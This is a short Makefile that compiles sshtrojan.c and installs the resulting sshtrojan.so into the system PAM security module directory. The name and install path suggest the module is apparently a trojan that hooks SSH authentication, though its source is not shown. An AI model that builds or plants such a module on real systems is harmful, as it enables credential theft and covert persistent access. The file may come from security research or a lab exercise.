sshtrojan.so :
	gcc -Wall -fPIC -g sshtrojan.c -c -o sshtrojan.o
	ld -x --shared -o /usr/lib/x86_64-linux-gnu/security/sshtrojan.so sshtrojan.o

clean :
	rm -f sshtrojan.o
	rm -f pam-example.o